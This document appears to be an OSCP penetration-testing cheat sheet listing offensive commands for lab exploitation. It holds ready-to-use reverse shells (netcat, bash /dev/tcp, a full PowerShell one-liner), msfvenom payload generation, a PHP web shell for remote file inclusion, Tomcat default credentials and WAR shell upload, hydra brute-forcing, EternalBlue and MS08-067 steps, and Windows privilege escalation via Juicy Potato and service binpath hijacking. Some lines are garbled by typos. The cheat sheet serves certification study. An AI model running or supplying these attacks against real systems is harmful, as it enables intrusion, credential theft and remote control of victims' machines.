# OSCP-Cheat-Sheet

## Common Commands

<code>python -m SimpleHTTPServer [PORT]</code>

### Upgrading Reverse Shell

Follow steps found [here](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)

<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>

<code>export TERM=screen</code>

Background the shell with <code>Ctrl+Z</code>

<code>stty raw echo</code>

Foreground the shell with <code>fg</code> 

Hit Return 2x

### Netcat Listener

Linux: <code>nc -lnvp [PORT]</code>

Windows: <code>nc.exe -lnvcp [PORT]</code>

## Reverse Shells

[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

### Netcat

Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>

Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>

### Bash One-Liner

<code> 0<&118-;exec 118<>/dev/tcp/[IP]/[PORT];sh <&118 >&118 2>&118</code>

### Powershell One-Liners

<code>powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='[IP]';$port=[PORT]];$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"</code>

## NMAP

### TCP 

<code>nmap -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.tcp] -p- [IP]</code>

### UDP

<code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>

## SMB/Samba

<code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>

<code>smbclient -L //[IP]/</code>

<code>enum4linux -a [IP]</code>

<code>smbmap -H [IP]</code>

<code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

## Werb Servers

<code>dirb [URL]</code>

<code>nikto -h [URL]</code>

### Wordlists

<code>cewl [URL]</code>

### Bruteforcing POST requests

<code>hydra -l/-L [USERNAME/USER_LIST] -P [PASSWORDLIST] [IP] http-form-post "[ENDPOINT]:[POST_PARAMETERS]&User=^USER^&Password=^PASS^:[FAILED_LOGIN_ERROR]."</code>

### ASP / ASP.NET

#### ASP Paylod: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>

#### ASP.NET Payload: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>

### Tomcat

#### Default Credentials

<code>admin:admin</code>

<code>tomcat:tomcat</code>

<code>admin:[NOTHING]</code>

<code>admin:s3cr3t</code>

<code>tomcat:s3cr3t</code>

<code>admin:tomcat</code>

#### Payload

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>

#### Uploading to Tomcat6

<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>

#### Uploading to Tomcat7 and Above

<code>curl -v -u [USER]:[PASSWORD] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>

### Local File Inclusion / Remote File Inclusion (LFI / RFI)

<code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code>

#### LFI

Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>

Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>

Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>

#### RFI

<code>ge?php echo shell_exec($_GET['cmd']); ?\le</code>

Store in a file on local host, navigate to it via the web app and pass commands to it.

<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=http://[LOCAL_IP]/rfi.txt&cmd=[COMMAND]</code>

## FTP 

### Brute Force

<code>hydra -V -f -L [USER_LIST] -P [PASSWORDS_LIST] ftp://[IP] -u -vV</code>

### Download

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>get [FILE]</code>

### Upload

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>put [FILE]</code>


## SMB Exploitation

### Eternal Blue (MS17-010) 

Use exploit found [here](https://github.com/worawit/MS17-010)

#### Payload

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>

Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>


Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>

Modify them to upload and execute the payload file

Use listener 

<code>nc -lnvp [PORT]</code>

### MS08-067

Use exploit found [here](https://github.com/andyacer/ms08_067)

#### Payloads

Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>

Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>

Replace shell code in the script 

Execute the script

<code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>

Use listener 

<code>nc -lnvp [PORT]</code>

## Linux Privilege Escalation

### Priv Esc Scripts

<code>LinPEAS.sh</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

<code>LinEnum.sh</code> Found [here](https://github.com/rebootuser/LinEnum)

### SUID Binaries

- [GTFOBins](https://gtfobins.github.io/)
- [Priv Esc with SUIDs](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)


## Windows Privilege Escalation

### Juicy Potato

Found [here](https://github.com/ohpe/juicy-potato) ([pre-compile binaries](https://github.com/ohpe/juicy-potato/releases))

#### Vulnerable OS Versions

- Windows 7 Enterprise
- Windows 8.1 Enterprise
- Windows 10 Enterprise
- Windows 10 Professional
- Windows Server 2008 R2 Enterprise
- Windows Server 2012 Datacenter
- Windows Server 2016 Standard

#### Required Permissions
- <code>SeImpersonate</code>
- <code>SeAssignPrimaryToken</code>

#### Generating the payload

Windows x64: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>

Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>

#### Execution

Create the listener to cath the payload

<code>nc -lnvp [PORT]</code>

Run the exploit on the target host.

<code>JuicyPotato.exe -l 1337 -p [DIR\TO\PAYLOAD] -t * -c {CLSID}</code>

### Service Exploitation


#### Windows XP SP0/SP1

Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.

<code>accesschk.exe /accepteula -uwcqv "Autenticated Users" *</code>

Running the following gives more information about the specified service (i.e. what groups have what permissions over it).

<code>accesschk.exe /accepteula -ucqv [SERVICE]</code>

To see the start type, dependencies, and binary path the service uses:

<code>sc qc [SERVICE]</code>

Check the status of the service.

<code>sc query [SERVICE]</code>

If needed, change the start type of the service 

<code>sc config [SERVICE] start= auto</code>

Changing the binary path:

<code>sc config [SERVICE] binpath= [PATH\TO\nc.exe [KALI IP] [PORT] -e C:\WINDOWS\System32\cmd.exe]</code>

Setup the netcat listener and start the service.

Starting / Stopping the Service

<code>net start [SERVICE]</code>

<code>net stop [SERVICE]</code>